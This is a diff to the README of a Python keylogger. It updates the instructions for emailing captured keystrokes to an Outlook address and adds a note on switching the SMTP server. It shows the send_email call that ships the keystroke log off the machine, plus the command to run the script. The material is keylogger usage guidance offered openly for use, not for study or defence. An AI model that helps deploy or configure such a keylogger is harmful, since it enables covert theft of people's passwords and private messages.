@@ -32,8 +32,10 @@ This keylogger demonstrates how a basic keylogger can be implemented using the p
 5. **Important:** Modify the `send_email` function parameters to use your own email and password. Replace the following line with your information:
 
   ```python
-  send_email("your_email@example.com","your_password",log.encode('utf-8'))
+  send_email("your_email@outlook.com","your_password",log.encode('utf-8'))
   ```
+Note: Remember to change "email_server = smtplib.SMTP("smtp-mail.outlook.com", 587)" to use another mail service.
+
 6. Run the script by executing the following command:
   ```sh
   python3 key_logger.py
